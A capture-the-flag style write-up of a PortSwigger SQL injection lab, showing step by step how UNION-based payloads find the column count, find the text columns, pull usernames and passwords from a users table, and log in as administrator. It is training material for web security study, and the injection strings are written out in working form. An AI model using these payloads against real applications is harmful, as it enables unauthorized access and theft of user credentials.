Link : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

![image](https://github.com/user-attachments/assets/8f82d307-b3a2-4af2-8887-d8b8dcbe8bec)


Note *** you must have knowledge from previous labs ****

Given :

table_name =  users

column _name =  username and password

Goal: Perform a Sql Injection Union attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Lets divide the lab in smaller steps:

step 1 : determining the number of columns present in the query.

step 2 : determining which columns will return string / text data type:

step 3 : retrieving username and password for users table .

step 4 (last_ step): log in as a administrator with retrieved password.


step 1 : determining the number of columns present in the query.
![image](https://github.com/user-attachments/assets/4bcd6870-ba18-4bdc-b658-62c8a5ba5cdb)


Query= ' order by 1 -- 
![image](https://github.com/user-attachments/assets/43ddac6f-bce6-41b0-ace3-55bf84725bc6)
![image](https://github.com/user-attachments/assets/a08f0902-82fb-4df6-b0b3-7b5479a7cd49)



Query = ‘ order by 2  -- 
![image](https://github.com/user-attachments/assets/7825e701-7d34-4d3b-b83a-4c5a06e9de20)
![image](https://github.com/user-attachments/assets/a84a3f20-8ccf-4d88-a843-475861b38fe2)



Query= ' order by 3 -- 

![image](https://github.com/user-attachments/assets/c3b35855-1217-4534-a77c-ad20c679fa44)

![image](https://github.com/user-attachments/assets/1ace29ab-3a48-4508-9c81-9c16ff66f6d4)


and we got error .

number of column = 3-1 = 2 


Step 2: Identify Columns with String/Text Data Type
![image](https://github.com/user-attachments/assets/9c311ef7-c3b6-4e3d-b8a6-12b2e014bdf2)


Now we will check which column will support string/text value .

Query= ' union select null,null -- 

![image](https://github.com/user-attachments/assets/7c6db3a5-1850-4ec0-a906-100e14f4d376)
![image](https://github.com/user-attachments/assets/6a997b7e-0857-4732-8d8d-94b86cc05f99)



Query = ' union select 'text1',null -- 

![image](https://github.com/user-attachments/assets/bf907d65-1e3e-4073-8b3f-9a3c63281f19)

![image](https://github.com/user-attachments/assets/71ed5b61-bd10-4f9a-9151-10d447f3859f)



Query=' union select 'text1','tex2'  -- 

![image](https://github.com/user-attachments/assets/bffa0ae5-0313-4227-bf17-ae77b4f5955b)

![image](https://github.com/user-attachments/assets/32456d9b-c4fe-444b-a42b-8065c71d9028)



and result of the query can be on below image.
![image](https://github.com/user-attachments/assets/9440e079-cac0-45a8-aa88-38fc5130cca8)






Step 3: Retrieve Usernames and Passwords
![image](https://github.com/user-attachments/assets/2e00e826-295d-4e21-ae1b-e672c224b98d)

Query=' union select username,password from users -- 

![image](https://github.com/user-attachments/assets/73b824c4-e090-41e6-842f-661dd145ec83)

![image](https://github.com/user-attachments/assets/29676045-ff3f-46df-93bf-f8dc86dcf845)




and we got the creadentials of all the users in the users table.

note *** these is lab that's why password is not in hash format in real world it always stored in hash format. ****


Step 4: Log in as an Administrator

now we got the creadential for administrator let login.

username: administrator
password : lvslwtmnaxqrdw2zhwfu
![image](https://github.com/user-attachments/assets/302d8967-a40c-419b-91b2-4b7e2d0d2b3d)


